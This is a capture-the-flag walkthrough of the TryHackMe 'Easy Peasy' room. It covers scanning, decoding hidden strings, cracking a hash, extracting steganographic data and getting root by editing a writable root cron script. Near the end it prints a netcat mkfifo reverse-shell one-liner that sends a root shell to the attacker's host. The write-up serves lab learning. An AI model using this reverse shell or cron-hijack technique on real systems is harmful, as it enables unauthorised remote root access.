---
title: "Try Hack Me: Easy Peasy Walkthrough"
classes: wide
header:
  teaser: /assets/images/Covers/easy_peasy.png
ribbon:   DodgerBlue
description: "We will walkthrough 'Easy Peasy' the challenge provided by THM"
categories:
  - Write-ups
toc: true
---

this is my walk through [Easy Peasy](https://tryhackme.com/room/easypeasyctf) room on try hack me.

there is a common methodology to walk through any CTF challenge:

1. Enumeration
1. Exploitation
1. Privilege Escalation

# Outlines

How to deal with decrypted text?

1. try to decrypt it with Cyber Chef
1. if can’t so it’s a hash
1. try to crack the hash with with crack station or hashes
1. search with the hash in google
1. use john to crack the hash.

How to analyse photos?

1. use strings
1. use steghide extract -sf image
1. use exiftool

# Enumeration

in this phase we try to discover (open ports, services, and technologies of the target).

we use NMAP to complete this phase.

`nmap -sV -Pn 10.10.242.227 -sC -p- -T4 --min-rate 5000`

- **-Pn**: to avoid pinging the target before ping scan.
- **-sC**: to run basic scripts to enumerate the target.
- **-sV**: for version scan.
- **-p-**: to test all ports.
- **-T4**: to set scan set fast
- **--min-rate 5000**: to set minimum request per second to 5000.

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*yoASQZefBcEewTcCckJTJQ.png)

you can walk through these steps to test any web page in CTFs:

1. dig source code for comments contains important information or links in `href` tag.
1. open `robots.txt` if available.
1. use `gobuster` to brute force directories.
1. dig Java script files for any vulnerability.
1. search in parameters for any vulnerability

by following previous steps you won’t find any info in the source code or in the `robots.txt`.

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Wq4FrKuWZYUZeKeSJQbO8w.png)

for each web page follow previous steps you will find

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*8Zu1eALcQRrmFrWdm0sPPA.png)

you will find this in the source code of `/hidden/whatever/`:

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*V5JwZKjENQWElFiYogfcQg.png)

i thing it’s an encoded text, so i will use [cyberchef](https://gchq.github.io/CyberChef/) to decode it .

by using magic method in cyberchef you will get that it’s base64 encoded. decode it you will get the first flag.

if you tried the previous steps on that page you won’t find anything, so let’s go through other NMAP results.

after navigate to the second web server you will find apache 2 default web page.

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*KprlxekPVwNqaRHm72T5rg.png)

we will follow the same steps.

after first step:

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*wnAKKhK4v6KzzdJSeqDK8g.png)

it’s look like hash so i will use crackstation or hashes to crack it but it doesn’t work.

i searched with the hash and i find it.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*_BbwpkR_zg2HiBU5Cv9VmQ.png)

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*AvLUSaMZsEYPt_EWHO0Avg.png)

it tells you that encoded with ba…. so we will try all base formates to encode it. i found that it’s base62 encoded. it’s a name of hiden directory.

navigate to the hidden directory and follow our steps.

after the first step:

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*YvDwfysK05oFN-6LMLzJgA.png)

i tried to detect the encoding algorithm with Cyber Chef but i can’t so i guess this is a hash.

we will follow the steps i mentioned in the header.

finally i downloaded the photo and try to analyse it.

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*-6UAUdg-RpM9aHEN2FWAyQ.png)

i used `steghide` to extract the image.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*6peEYsEHJ3ebmpT7L8XLeQ.png)

i used the password we just cracked.

after viewing the `secrettext.txt` file i found username and password in binary format so i decrypt it and signed in to SSH.

after i loged , i found user flag but it said that may be rotated so i used ROT encrypt to decrypt the flag.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ghrG_jDJ8EaC6VHZs973GA.png)

to get root flag i view cron tabs :

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*sjQdD2fED4ChqNrgCjvoqg.png)

that tells you he will go to `/var/www/` directory and run a script as a root.

i listed the script file and i found that i can edit it

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*mrxv62MHH55MYWNf_n9W-w.png)

i will make this script to reverse shell to my machine.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> <port> >/tmp/f
```

this make the target reverse shell to me as a root

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*b5TuTu9mN7uziizGXueN_Q.png)

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ty9wLdBgQ_RkeBqR7JZ_ew.png)

i `cat` the root flag.

Congratulation, but don’t forget to terminate the machine.

hope this help you.